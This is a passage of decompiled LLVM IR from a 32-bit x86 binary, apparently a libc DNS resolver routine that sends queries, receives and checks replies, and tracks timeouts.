  %v0_804cb56130 = phi i32 [ %v3_804ca9b, %dec_label_pc_804caae.lr.ph ], [ %v1_804caa1, %dec_label_pc_804caa1 ]
  %v0_804caa2129 = phi i32 [ %v2_804ca99, %dec_label_pc_804caae.lr.ph ], [ %v1_804caa2, %dec_label_pc_804caa1 ]
  %v4_804cab3128 = phi i32 [ %v4_804cab350, %dec_label_pc_804caae.lr.ph ], [ %v4_804cab349, %dec_label_pc_804caa1 ]
  %v1_804caae = inttoptr i32 %v0_804caae.pre to i32*
  %v2_804caae = load i32, i32* %v1_804caae, align 4
  store i32 %v2_804caae, i32* %ecx.global-to-local, align 4
  %v1_804cab1 = inttoptr i32 %v0_804caa2129 to i32*
  %v2_804cab1 = load i32, i32* %v1_804cab1, align 4
  store i32 %v2_804cab1, i32* %edx.global-to-local, align 4
  %v1_804cab3 = inttoptr i32 %v2_804caae to i8*
  %v2_804cab3 = load i8, i8* %v1_804cab3, align 1
  %v3_804cab3 = zext i8 %v2_804cab3 to i32
  %v5_804cab3 = and i32 %v4_804cab3128, -256
  %v6_804cab3 = or i32 %v3_804cab3, %v5_804cab3
  store i32 %v6_804cab3, i32* %eax.global-to-local, align 4
  %v3_804cab5 = inttoptr i32 %v2_804cab1 to i8*
  %v4_804cab5 = load i8, i8* %v3_804cab5, align 1
  %v15_804cab5 = icmp eq i8 %v2_804cab3, %v4_804cab5
  %v1_804cab7 = icmp eq i1 %v15_804cab5, false
  br i1 %v1_804cab7, label %dec_label_pc_804caa1, label %dec_label_pc_804cab9

dec_label_pc_804cab9:                             ; preds = %dec_label_pc_804caae
  %v1_804cab9 = add i32 %v2_804caae, 1
  %v2_804cab9 = inttoptr i32 %v1_804cab9 to i8*
  %v3_804cab9 = load i8, i8* %v2_804cab9, align 1
  %v4_804cab9 = zext i8 %v3_804cab9 to i32
  %v7_804cab9 = or i32 %v4_804cab9, %v5_804cab3
  store i32 %v7_804cab9, i32* %eax.global-to-local, align 4
  %v3_804cabc = add i32 %v2_804cab1, 1
  %v4_804cabc = inttoptr i32 %v3_804cabc to i8*
  %v5_804cabc = load i8, i8* %v4_804cabc, align 1
  %v16_804cabc = icmp eq i8 %v3_804cab9, %v5_804cabc
  %v1_804cabf = icmp eq i1 %v16_804cabc, false
  br i1 %v1_804cabf, label %dec_label_pc_804caa1, label %dec_label_pc_804cac9

dec_label_pc_804cac3:                             ; preds = %dec_label_pc_804caa1, %dec_label_pc_804ca92
  %v0_804cb56.lcssa = phi i32 [ %v3_804ca9b, %dec_label_pc_804ca92 ], [ %v1_804caa1, %dec_label_pc_804caa1 ]
  %v15_804caa5.lcssa.in = phi i32 [ %v5_804caa5119, %dec_label_pc_804ca92 ], [ %v5_804caa5, %dec_label_pc_804caa1 ]
  %v15_804caa5.lcssa = icmp eq i32 %v15_804caa5.lcssa.in, 0
  br i1 %v15_804caa5.lcssa, label %dec_label_pc_804cba7, label %dec_label_pc_804cac9

dec_label_pc_804cac9:                             ; preds = %dec_label_pc_804cab9, %dec_label_pc_804cac3
  %v0_804cb5686 = phi i32 [ %v0_804cb56.lcssa, %dec_label_pc_804cac3 ], [ %v0_804cb56130, %dec_label_pc_804cab9 ]
  %v1_804cac9 = add i32 %v17_804cb0a, 736
  %v2_804cac9 = inttoptr i32 %v1_804cac9 to i32*
  %v3_804cac9 = load i32, i32* %v2_804cac9, align 4
  %v1_804cad0 = mul i32 %v0_804cb5686, 4
  store i32 %v1_804cad0, i32* %edx.global-to-local, align 4
  %v2_804cad7 = add i32 %v3_804cac9, %v1_804cad0
  store i32 %v2_804cad7, i32* @ecx, align 4
  %v1_804cad9 = inttoptr i32 %v2_804cad7 to i32*
  %v2_804cad9 = load i32, i32* %v1_804cad9, align 4
  %v3_804cad9 = icmp eq i32 %v2_804cad9, 0
  %v1_804cadc = icmp eq i1 %v3_804cad9, false
  br i1 %v1_804cadc, label %dec_label_pc_804cba7, label %dec_label_pc_804cae2

dec_label_pc_804cae2:                             ; preds = %dec_label_pc_804cac9
  %v0_804cae2 = load i32, i32* @ebp, align 4
  %v1_804cae2 = inttoptr i32 %v0_804cae2 to i32*
  %v2_804cae2 = load i32, i32* %v1_804cae2, align 4
  store i32 %v2_804cae2, i32* %eax.global-to-local, align 4
  %v1_804cae5 = add i32 %v2_804cae2, 3
  %v2_804cae5 = inttoptr i32 %v1_804cae5 to i8*
  %v3_804cae5 = load i8, i8* %v2_804cae5, align 1
  %tmp205 = urem i8 %v3_804cae5, 16
  %v1_804cae9 = zext i8 %tmp205 to i32
  %v2_804cae9 = icmp eq i8 %tmp205, 0
  store i32 %v1_804cae9, i32* %eax.global-to-local, align 4
  %v9_804caec = icmp eq i8 %tmp205, 2
  br i1 %v9_804caec, label %dec_label_pc_804caff, label %dec_label_pc_804caf1

dec_label_pc_804caf1:                             ; preds = %dec_label_pc_804cae2
  %v9_804caf1 = icmp eq i8 %tmp205, 3
  br i1 %v9_804caf1, label %dec_label_pc_804cb56, label %dec_label_pc_804caf6

dec_label_pc_804caf6:                             ; preds = %dec_label_pc_804caf1
  br i1 %v2_804cae9, label %dec_label_pc_804cb56, label %dec_label_pc_804cba7

dec_label_pc_804caff:                             ; preds = %dec_label_pc_804cae2
  %v1_804caff = add i32 %v17_804cb0a, 28
  %v2_804caff = inttoptr i32 %v1_804caff to i32*
  %v3_804caff = load i32, i32* %v2_804caff, align 4
  %v4_804caff = icmp eq i32 %v3_804caff, 0
  br i1 %v4_804caff, label %dec_label_pc_804cba7, label %dec_label_pc_804cb0a

dec_label_pc_804cb0a:                             ; preds = %dec_label_pc_804caff
  %v4_804cb0a = add i32 %v3_804caff, -1
  store i32 %v4_804cb0a, i32* %v2_804caff, align 4
  %v0_804cb0e = load i32, i32* @esp, align 4
  %v1_804cb0e = add i32 %v0_804cb0e, 28
  %v2_804cb0e = inttoptr i32 %v1_804cb0e to i32*
  %v3_804cb0e = load i32, i32* %v2_804cb0e, align 4
  %v13_804cb0e = icmp eq i32 %v3_804cb0e, -1
  br i1 %v13_804cb0e, label %dec_label_pc_804cba7, label %dec_label_pc_804cb19

dec_label_pc_804cb19:                             ; preds = %dec_label_pc_804cb0a
  %v0_804cb19 = load i32, i32* @ebx, align 4
  %v2_804cb19 = add i32 %v0_804cb0e, -4
  %v3_804cb19 = inttoptr i32 %v2_804cb19 to i32*
  store i32 %v0_804cb19, i32* %v3_804cb19, align 4
  %v0_804cb1a = load i32, i32* @ebx, align 4
  %v2_804cb1a = add i32 %v0_804cb0e, -8
  %v3_804cb1a = inttoptr i32 %v2_804cb1a to i32*
  store i32 %v0_804cb1a, i32* %v3_804cb1a, align 4
  %v1_804cb1b = add i32 %v0_804cb0e, 32
  %v2_804cb1b = inttoptr i32 %v1_804cb1b to i32*
  %v3_804cb1b = load i32, i32* %v2_804cb1b, align 4
  %v5_804cb1b = add i32 %v0_804cb0e, -12
  %v6_804cb1b = inttoptr i32 %v5_804cb1b to i32*
  store i32 %v3_804cb1b, i32* %v6_804cb1b, align 4
  %v2_804cb1f = add i32 %v0_804cb0e, 56
  %v3_804cb1f = inttoptr i32 %v2_804cb1f to i32*
  %v4_804cb1f = load i32, i32* %v3_804cb1f, align 4
  %v6_804cb1f = mul i32 %v4_804cb1f, 28
  %v1_804cb24 = add i32 %v0_804cb0e, 460
  store i32 %v1_804cb24, i32* %ecx.global-to-local, align 4
  %v2_804cb2b = add i32 %v6_804cb1f, %v1_804cb24
  store i32 %v2_804cb2b, i32* %eax.global-to-local, align 4
  %v2_804cb2e = add i32 %v0_804cb0e, -16
  %v3_804cb2e = inttoptr i32 %v2_804cb2e to i32*
  store i32 %v2_804cb2b, i32* %v3_804cb2e, align 4
  %v1_804cb2f = add i32 %v0_804cb0e, -20
  %v2_804cb2f = inttoptr i32 %v1_804cb2f to i32*
  store i32 16384, i32* %v2_804cb2f, align 4
  %v1_804cb34 = add i32 %v0_804cb0e, 728
  %v2_804cb34 = inttoptr i32 %v1_804cb34 to i32*
  %v3_804cb34 = load i32, i32* %v2_804cb34, align 4
  store i32 %v3_804cb34, i32* %eax.global-to-local, align 4
  %v1_804cb3b = load i32, i32* %edx.global-to-local, align 4
  %v2_804cb3b = add i32 %v1_804cb3b, %v3_804cb34
  %v3_804cb3b = inttoptr i32 %v2_804cb3b to i32*
  %v4_804cb3b = load i32, i32* %v3_804cb3b, align 4
  %v6_804cb3b = add i32 %v0_804cb0e, -24
  %v7_804cb3b = inttoptr i32 %v6_804cb3b to i32*
  store i32 %v4_804cb3b, i32* %v7_804cb3b, align 4
  %v1_804cb3e = add i32 %v0_804cb0e, 724
  %v2_804cb3e = inttoptr i32 %v1_804cb3e to i32*
  %v3_804cb3e = load i32, i32* %v2_804cb3e, align 4
  store i32 %v3_804cb3e, i32* %ecx.global-to-local, align 4
  %v1_804cb45 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cb45 = add i32 %v1_804cb45, %v3_804cb3e
  %v3_804cb45 = inttoptr i32 %v2_804cb45 to i32*
  %v4_804cb45 = load i32, i32* %v3_804cb45, align 4
  %v6_804cb45 = add i32 %v0_804cb0e, -28
  %v7_804cb45 = inttoptr i32 %v6_804cb45 to i32*
  store i32 %v4_804cb45, i32* %v7_804cb45, align 4
  %v1_804cb48 = add i32 %v0_804cb0e, 16
  %v2_804cb48 = inttoptr i32 %v1_804cb48 to i32*
  %v3_804cb48 = load i32, i32* %v2_804cb48, align 4
  %v5_804cb48 = add i32 %v0_804cb0e, -32
  %v6_804cb48 = inttoptr i32 %v5_804cb48 to i32*
  store i32 %v3_804cb48, i32* %v6_804cb48, align 4
  %v6_804cb4c = call i32 @sendto(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804cb4c, i32* %eax.global-to-local, align 4
  %v0_804cb51 = load i32, i32* @esp, align 4
  %v1_804cb51 = add i32 %v0_804cb51, 32
  br label %dec_label_pc_804cba7

dec_label_pc_804cb56:                             ; preds = %dec_label_pc_804caf6, %dec_label_pc_804caf1
  %v4_804cb56 = load i32, i32* %v2_804ca9b, align 4
  %v15_804cb56 = icmp eq i32 %v0_804cb5686, %v4_804cb56
  %v0_804cb5a = load i32, i32* @esi, align 4
  store i32 %v0_804cb5a, i32* %v1_804cad9, align 4
  %v1_804cb5c = icmp eq i1 %v15_804cb56, false
  br i1 %v1_804cb5c, label %dec_label_pc_804cb83, label %dec_label_pc_804cb5e

dec_label_pc_804cb5e:                             ; preds = %dec_label_pc_804cb56
  %v0_804cb5e = load i32, i32* %edx.global-to-local, align 4
  %v1_804cb5e = load i32, i32* @esp, align 4
  %v2_804cb5e = add i32 %v1_804cb5e, 736
  %v3_804cb5e = inttoptr i32 %v2_804cb5e to i32*
  %v4_804cb5e = load i32, i32* %v3_804cb5e, align 4
  %v5_804cb5e = add i32 %v4_804cb5e, %v0_804cb5e
  store i32 %v5_804cb5e, i32* %edx.global-to-local, align 4
  %v1_804cb6b133 = add i32 %v1_804cb5e, 720
  %v2_804cb6b134 = inttoptr i32 %v1_804cb6b133 to i32*
  %v3_804cb6b135 = load i32, i32* %v2_804cb6b134, align 4
  store i32 %v3_804cb6b135, i32* %eax.global-to-local, align 4
  %v1_804cb72136 = add i32 %v1_804cb5e, 40
  %v2_804cb72137 = inttoptr i32 %v1_804cb72136 to i32*
  %v3_804cb72138 = load i32, i32* %v2_804cb72137, align 4
  %v5_804cb72139 = sub i32 %v3_804cb72138, %v3_804cb6b135
  %v11_804cb72141 = xor i32 %v3_804cb72138, %v3_804cb6b135
  %v12_804cb72142 = xor i32 %v5_804cb72139, %v3_804cb72138
  %v13_804cb72143 = and i32 %v12_804cb72142, %v11_804cb72141
  %v14_804cb72144 = icmp slt i32 %v13_804cb72143, 0
  %v16_804cb72146 = icmp slt i32 %v5_804cb72139, 0
  %v2_804cb76147 = icmp eq i1 %v16_804cb72146, %v14_804cb72144
  br i1 %v2_804cb76147, label %dec_label_pc_804cb9a.loopexit, label %dec_label_pc_804cb78

dec_label_pc_804cb67:                             ; preds = %dec_label_pc_804cb78
  %v3_804cb67 = load i32, i32* %v2_804cb72149, align 4
  %v4_804cb67 = add i32 %v3_804cb67, 1
  store i32 %v4_804cb67, i32* %v2_804cb72149, align 4
  %v0_804cb6b.pre = load i32, i32* @esp, align 4
  %v1_804cb6b = add i32 %v0_804cb6b.pre, 720
  %v2_804cb6b = inttoptr i32 %v1_804cb6b to i32*
  %v3_804cb6b = load i32, i32* %v2_804cb6b, align 4
  store i32 %v3_804cb6b, i32* %eax.global-to-local, align 4
  %v1_804cb72 = add i32 %v0_804cb6b.pre, 40
  %v2_804cb72 = inttoptr i32 %v1_804cb72 to i32*
  %v3_804cb72 = load i32, i32* %v2_804cb72, align 4
  %v5_804cb72 = sub i32 %v3_804cb72, %v3_804cb6b
  %v11_804cb72 = xor i32 %v3_804cb72, %v3_804cb6b
  %v12_804cb72 = xor i32 %v5_804cb72, %v3_804cb72
  %v13_804cb72 = and i32 %v12_804cb72, %v11_804cb72
  %v14_804cb72 = icmp slt i32 %v13_804cb72, 0
  %v16_804cb72 = icmp slt i32 %v5_804cb72, 0
  %v2_804cb76 = icmp eq i1 %v16_804cb72, %v14_804cb72
  br i1 %v2_804cb76, label %dec_label_pc_804cb6b.dec_label_pc_804cb9a.loopexit_crit_edge, label %dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge

dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge: ; preds = %dec_label_pc_804cb67
  %v0_804cb78.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cb78

dec_label_pc_804cb78:                             ; preds = %dec_label_pc_804cb5e, %dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge
  %v0_804cb78 = phi i32 [ %v0_804cb78.pre, %dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge ], [ %v5_804cb5e, %dec_label_pc_804cb5e ]
  %v2_804cb72149 = phi i32* [ %v2_804cb72, %dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge ], [ %v2_804cb72137, %dec_label_pc_804cb5e ]
  %v0_804cb67148 = phi i32 [ %v0_804cb6b.pre, %dec_label_pc_804cb67.dec_label_pc_804cb78_crit_edge ], [ %v1_804cb5e, %dec_label_pc_804cb5e ]
  %v1_804cb78 = inttoptr i32 %v0_804cb78 to i32*
  %v2_804cb78 = load i32, i32* %v1_804cb78, align 4
  store i32 %v2_804cb78, i32* %eax.global-to-local, align 4
  %v1_804cb7a = add i32 %v0_804cb78, 4
  store i32 %v1_804cb7a, i32* %edx.global-to-local, align 4
  %v1_804cb7d = icmp eq i32 %v2_804cb78, 0
  %v1_804cb7f = icmp eq i1 %v1_804cb7d, false
  br i1 %v1_804cb7f, label %dec_label_pc_804cb67, label %dec_label_pc_804cb78.dec_label_pc_804cb9a.loopexit_crit_edge

dec_label_pc_804cb83:                             ; preds = %dec_label_pc_804cb56
  %v0_804cb83 = load i32, i32* @ecx, align 4
  %v1_804cb83 = load i32, i32* @esp, align 4
  %v2_804cb83 = add i32 %v1_804cb83, -4
  %v3_804cb83 = inttoptr i32 %v2_804cb83 to i32*
  store i32 %v0_804cb83, i32* %v3_804cb83, align 4
  %v0_804cb84 = load i32, i32* @esi, align 4
  %v2_804cb84 = add i32 %v1_804cb83, -8
  %v3_804cb84 = inttoptr i32 %v2_804cb84 to i32*
  store i32 %v0_804cb84, i32* %v3_804cb84, align 4
  %v0_804cb85 = load i32, i32* @ebp, align 4
  %v1_804cb85 = inttoptr i32 %v0_804cb85 to i32*
  %v2_804cb85 = load i32, i32* %v1_804cb85, align 4
  %v4_804cb85 = add i32 %v1_804cb83, -12
  %v5_804cb85 = inttoptr i32 %v4_804cb85 to i32*
  store i32 %v2_804cb85, i32* %v5_804cb85, align 4
  %v1_804cb88 = add i32 %v1_804cb83, 732
  %v2_804cb88 = inttoptr i32 %v1_804cb88 to i32*
  %v3_804cb88 = load i32, i32* %v2_804cb88, align 4
  store i32 %v3_804cb88, i32* %ecx.global-to-local, align 4
  %v1_804cb8f = load i32, i32* %edx.global-to-local, align 4
  %v2_804cb8f = add i32 %v1_804cb8f, %v3_804cb88
  %v3_804cb8f = inttoptr i32 %v2_804cb8f to i32*
  %v4_804cb8f = load i32, i32* %v3_804cb8f, align 4
  %v6_804cb8f = add i32 %v1_804cb83, -16
  %v7_804cb8f = inttoptr i32 %v6_804cb8f to i32*
  store i32 %v4_804cb8f, i32* %v7_804cb8f, align 4
  %v4_804cb92 = call i32 @memcpy(i8* inttoptr (i32 5000 to i8*), i32 2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804cb92, i32* %eax.global-to-local, align 4
  %v0_804cb97 = load i32, i32* @esp, align 4
  %v1_804cb97 = add i32 %v0_804cb97, 16
  br label %dec_label_pc_804cb9a

dec_label_pc_804cb6b.dec_label_pc_804cb9a.loopexit_crit_edge: ; preds = %dec_label_pc_804cb67
  br label %dec_label_pc_804cb9a.loopexit

dec_label_pc_804cb78.dec_label_pc_804cb9a.loopexit_crit_edge: ; preds = %dec_label_pc_804cb78
  br label %dec_label_pc_804cb9a.loopexit

dec_label_pc_804cb9a.loopexit:                    ; preds = %dec_label_pc_804cb78.dec_label_pc_804cb9a.loopexit_crit_edge, %dec_label_pc_804cb6b.dec_label_pc_804cb9a.loopexit_crit_edge, %dec_label_pc_804cb5e
  %v0_804cb67.lcssa = phi i32 [ %v0_804cb6b.pre, %dec_label_pc_804cb6b.dec_label_pc_804cb9a.loopexit_crit_edge ], [ %v0_804cb67148, %dec_label_pc_804cb78.dec_label_pc_804cb9a.loopexit_crit_edge ], [ %v1_804cb5e, %dec_label_pc_804cb5e ]
  br label %dec_label_pc_804cb9a

dec_label_pc_804cb9a:                             ; preds = %dec_label_pc_804cb9a.loopexit, %dec_label_pc_804cb83
  %v0_804cb9a = phi i32 [ %v0_804cb67.lcssa, %dec_label_pc_804cb9a.loopexit ], [ %v1_804cb97, %dec_label_pc_804cb83 ]
  %v1_804cb9a = add i32 %v0_804cb9a, 720
  %v2_804cb9a = inttoptr i32 %v1_804cb9a to i32*
  %v3_804cb9a = load i32, i32* %v2_804cb9a, align 4
  store i32 %v3_804cb9a, i32* %eax.global-to-local, align 4
  %v1_804cba1 = add i32 %v0_804cb9a, 40
  %v2_804cba1 = inttoptr i32 %v1_804cba1 to i32*
  %v3_804cba1 = load i32, i32* %v2_804cba1, align 4
  %v15_804cba1 = icmp eq i32 %v3_804cba1, %v3_804cb9a
  br i1 %v15_804cba1, label %dec_label_pc_804cc0d, label %dec_label_pc_804cba7

dec_label_pc_804cba7:                             ; preds = %dec_label_pc_804caf6, %dec_label_pc_804ca3f, %dec_label_pc_804cb9a, %dec_label_pc_804cb0a, %dec_label_pc_804caff, %dec_label_pc_804cac9, %dec_label_pc_804cac3, %dec_label_pc_804ca84, %dec_label_pc_804cb19, %dec_label_pc_804ca14
  %v0_804cbaf = phi i32 [ %v1_804ca2f, %dec_label_pc_804ca14 ], [ %v1_804cb51, %dec_label_pc_804cb19 ], [ %v17_804cb0a, %dec_label_pc_804ca84 ], [ %v17_804cb0a, %dec_label_pc_804cac3 ], [ %v17_804cb0a, %dec_label_pc_804cac9 ], [ %v17_804cb0a, %dec_label_pc_804caff ], [ %v0_804cb0e, %dec_label_pc_804cb0a ], [ %v0_804cb9a, %dec_label_pc_804cb9a ], [ %v1_804cbe9, %dec_label_pc_804ca3f ], [ %v17_804cb0a, %dec_label_pc_804caf6 ]
  %v1_804cba7 = add i32 %v0_804cbaf, 32
  %v2_804cba7 = inttoptr i32 %v1_804cba7 to i32*
  %v3_804cba7 = load i32, i32* %v2_804cba7, align 4
  store i32 %v3_804cba7, i32* %edx.global-to-local, align 4
  %v1_804cbab = add i32 %v0_804cbaf, 40
  %v2_804cbab = inttoptr i32 %v1_804cbab to i32*
  %v3_804cbab = load i32, i32* %v2_804cbab, align 4
  store i32 %v3_804cbab, i32* %edi.global-to-local, align 4
  %v1_804cbaf = add i32 %v0_804cbaf, 732
  %v2_804cbaf = inttoptr i32 %v1_804cbaf to i32*
  %v3_804cbaf = load i32, i32* %v2_804cbaf, align 4
  store i32 %v3_804cbaf, i32* %ebp.global-to-local, align 4
  %v2_804cbb6 = add i32 %v0_804cbaf, 684
  %v3_804cbb6 = inttoptr i32 %v2_804cbb6 to i32*
  store i32 %v3_804cba7, i32* %v3_804cbb6, align 4
  %v0_804cbbd = load i32, i32* %edx.global-to-local, align 4
  %v1_804cbbd = load i32, i32* @esp, align 4
  %v2_804cbbd = add i32 %v1_804cbbd, -4
  %v3_804cbbd = inttoptr i32 %v2_804cbbd to i32*
  store i32 %v0_804cbbd, i32* %v3_804cbbd, align 4
  %v0_804cbbe = load i32, i32* %edx.global-to-local, align 4
  %v2_804cbbe = add i32 %v1_804cbbd, -8
  %v3_804cbbe = inttoptr i32 %v2_804cbbe to i32*
  store i32 %v0_804cbbe, i32* %v3_804cbbe, align 4
  %v1_804cbbf = add i32 %v1_804cbbd, 684
  store i32 %v1_804cbbf, i32* %ecx.global-to-local, align 4
  %v2_804cbc6 = add i32 %v1_804cbbd, -12
  %v3_804cbc6 = inttoptr i32 %v2_804cbc6 to i32*
  store i32 %v1_804cbbf, i32* %v3_804cbc6, align 4
  %v1_804cbc7 = add i32 %v1_804cbbd, 636
  store i32 %v1_804cbc7, i32* %eax.global-to-local, align 4
  %v2_804cbce = add i32 %v1_804cbbd, -16
  %v3_804cbce = inttoptr i32 %v2_804cbce to i32*
  store i32 %v1_804cbc7, i32* %v3_804cbce, align 4
  %v0_804cbcf = load i32, i32* %edi.global-to-local, align 4
  %v2_804cbcf = mul i32 %v0_804cbcf, 4
  store i32 %v2_804cbcf, i32* @edi, align 4
  %v1_804cbd2 = add i32 %v1_804cbbd, -20
  %v2_804cbd2 = inttoptr i32 %v1_804cbd2 to i32*
  store i32 0, i32* %v2_804cbd2, align 4
  %v0_804cbd4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cbd4 = load i32, i32* @edi, align 4
  %v2_804cbd4 = add i32 %v1_804cbd4, %v0_804cbd4
  store i32 %v2_804cbd4, i32* @ebp, align 4
  %v1_804cbd6 = add i32 %v1_804cbbd, 740
  %v2_804cbd6 = inttoptr i32 %v1_804cbd6 to i32*
  %v3_804cbd6 = load i32, i32* %v2_804cbd6, align 4
  %v5_804cbd6 = add i32 %v1_804cbbd, -24
  %v6_804cbd6 = inttoptr i32 %v5_804cbd6 to i32*
  store i32 %v3_804cbd6, i32* %v6_804cbd6, align 4
  %v0_804cbdd = load i32, i32* @ebp, align 4
  %v1_804cbdd = inttoptr i32 %v0_804cbdd to i32*
  %v2_804cbdd = load i32, i32* %v1_804cbdd, align 4
  %v4_804cbdd = add i32 %v1_804cbbd, -28
  %v5_804cbdd = inttoptr i32 %v4_804cbdd to i32*
  store i32 %v2_804cbdd, i32* %v5_804cbdd, align 4
  %v1_804cbe0 = add i32 %v1_804cbbd, 16
  %v2_804cbe0 = inttoptr i32 %v1_804cbe0 to i32*
  %v3_804cbe0 = load i32, i32* %v2_804cbe0, align 4
  %v5_804cbe0 = add i32 %v1_804cbbd, -32
  %v6_804cbe0 = inttoptr i32 %v5_804cbe0 to i32*
  store i32 %v3_804cbe0, i32* %v6_804cbe0, align 4
  %v6_804cbe4 = call i32 @recvfrom(i32 5000, i32 2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804cbe4, i32* %eax.global-to-local, align 4
  %v0_804cbe9 = load i32, i32* @esp, align 4
  %v2_804cbec = icmp slt i32 %v6_804cbe4, 0
  store i32 %v6_804cbe4, i32* @esi, align 4
  %v1_804cbf0 = icmp eq i1 %v2_804cbec, false
  br i1 %v1_804cbf0, label %dec_label_pc_804ca3f, label %dec_label_pc_804cbf6

dec_label_pc_804cbf6:                             ; preds = %dec_label_pc_804cba7, %dec_label_pc_804ca14
  %v0_804cbf6 = call i32 @mtime()
  store i32 %v0_804cbf6, i32* %eax.global-to-local, align 4
  store i32 %v0_804cbf6, i32* @ebx, align 4
  %v1_804cbff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cbfd

dec_label_pc_804cbfd:                             ; preds = %dec_label_pc_804c92d, %dec_label_pc_804cbf6
  %v1_804c9a5 = phi i32 [ %v1_804c995, %dec_label_pc_804c92d ], [ %v1_804cbff.pre, %dec_label_pc_804cbf6 ]
  %v0_804c99d = phi i32 [ %v0_804cbfd.pre, %dec_label_pc_804c92d ], [ %v0_804cbf6, %dec_label_pc_804cbf6 ]
  store i32 %v0_804c99d, i32* %eax.global-to-local, align 4
  %v2_804cbff = add i32 %v1_804c9a5, 52
  %v3_804cbff = inttoptr i32 %v2_804cbff to i32*
  %v4_804cbff = load i32, i32* %v3_804cbff, align 4
  %v5_804cbff = sub i32 %v0_804c99d, %v4_804cbff
  store i32 %v5_804cbff, i32* %eax.global-to-local, align 4
  %v2_804cc03 = add i32 %v1_804c9a5, 20
  %v3_804cc03 = inttoptr i32 %v2_804cc03 to i32*
  %v4_804cc03 = load i32, i32* %v3_804cc03, align 4
  %v10_804cc03 = icmp ult i32 %v5_804cbff, %v4_804cc03
  br i1 %v10_804cc03, label %dec_label_pc_804c99d, label %dec_label_pc_804cc0d

dec_label_pc_804cc0d:                             ; preds = %dec_label_pc_804cbfd, %dec_label_pc_804cb9a
  %v1_804cc0d = phi i32 [ %v0_804cb9a, %dec_label_pc_804cb9a ], [ %v1_804c9a5, %dec_label_pc_804cbfd ]
  %v0_804cc0d = phi i32 [ %v3_804cb9a, %dec_label_pc_804cb9a ], [ %v5_804cbff, %dec_label_pc_804cbfd ]
  %v2_804cc0d = add i32 %v1_804cc0d, -4
  %v3_804cc0d = inttoptr i32 %v2_804cc0d to i32*
  store i32 %v0_804cc0d, i32* %v3_804cc0d, align 4
  %v0_804cc0e = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc0e = add i32 %v1_804cc0d, -8
  %v3_804cc0e = inttoptr i32 %v2_804cc0e to i32*
  store i32 %v0_804cc0e, i32* %v3_804cc0e, align 4
  %v1_804cc0f = add i32 %v1_804cc0d, -12
  %v2_804cc0f = inttoptr i32 %v1_804cc0f to i32*
  store i32 1, i32* %v2_804cc0f, align 4
  %v1_804cc11 = add i32 %v1_804cc0d, 664
  store i32 %v1_804cc11, i32* @eax, align 4
  %v2_804cc18 = add i32 %v1_804cc0d, -16
  %v3_804cc18 = inttoptr i32 %v2_804cc18 to i32*
  store i32 %v1_804cc11, i32* %v3_804cc18, align 4
  %v0_804cc19 = call i32 @_pthread_cleanup_pop()
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804cc20 = load i32, i32* @esp, align 4
  %v1_804cc20 = add i32 %v0_804cc20, 16
  br label %dec_label_pc_804cc46

dec_label_pc_804cc25:                             ; preds = %dec_label_pc_804c84c, %dec_label_pc_804c841
  %v0_804cc4656 = phi i32 [ %v1_804c862, %dec_label_pc_804c84c ], [ %v0_804c841, %dec_label_pc_804c841 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc46

dec_label_pc_804cc2a:                             ; preds = %dec_label_pc_804c77f, %dec_label_pc_804c774
  %v0_804cc2a = phi i32 [ %v1_804c790, %dec_label_pc_804c77f ], [ %v0_804c774, %dec_label_pc_804c774 ]
  %v0_804cc2d = load i32, i32* @ebp, align 4
  %v2_804cc2d = add i32 %v0_804cc2a, -16
  %v3_804cc2d = inttoptr i32 %v2_804cc2d to i32*
  store i32 %v0_804cc2d, i32* %v3_804cc2d, align 4
  %v1_804cc2e = call i32 @__fclose_ca(i32 5000)
  store i32 %v1_804cc2e, i32* %eax.global-to-local, align 4
  %v0_804cc33 = load i32, i32* @esp, align 4
  %v1_804cc33 = add i32 %v0_804cc33, 16
  %v1_804cc36 = add i32 %v0_804cc33, 52
  %v2_804cc36 = inttoptr i32 %v1_804cc36 to i32*
  %v3_804cc36 = load i32, i32* %v2_804cc36, align 4
  %v4_804cc36 = icmp eq i32 %v3_804cc36, 0
  %v1_804cc3b = icmp eq i1 %v4_804cc36, false
  br i1 %v1_804cc3b, label %dec_label_pc_804c7f7, label %dec_label_pc_804c7bd

dec_label_pc_804cc46:                             ; preds = %dec_label_pc_804cc25, %dec_label_pc_804cc0d
  %v0_804cc46 = phi i32 [ %v0_804cc4656, %dec_label_pc_804cc25 ], [ %v1_804cc20, %dec_label_pc_804cc0d ]
  %v0_804cc50 = phi i32 [ -1, %dec_label_pc_804cc25 ], [ 0, %dec_label_pc_804cc0d ]
  %v1_804cc46 = add i32 %v0_804cc46, 700
  %v1_804cc4c = inttoptr i32 %v1_804cc46 to i32*
  %v2_804cc4c = load i32, i32* %v1_804cc4c, align 4
  store i32 %v2_804cc4c, i32* %ebx.global-to-local, align 4
  %v3_804cc4d = add i32 %v0_804cc46, 708
  %v1_804cc4e = inttoptr i32 %v3_804cc4d to i32*
  %v2_804cc4e = load i32, i32* %v1_804cc4e, align 4
  store i32 %v2_804cc4e, i32* @edi, align 4
  %v3_804cc4e = add i32 %v0_804cc46, 712
  %v1_804cc4f = inttoptr i32 %v3_804cc4e to i32*
  %v2_804cc4f = load i32, i32* %v1_804cc4f, align 4
  store i32 %v2_804cc4f, i32* @ebp, align 4
  ret i32 %v0_804cc50

; uselistorder directives
  uselistorder i32 %v0_804cc46, { 2, 1, 0 }
  uselistorder i32 %v1_804cc33, { 1, 0 }
  uselistorder i32 %v1_804cc0d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c99d, { 4, 3, 2, 1, 0 }
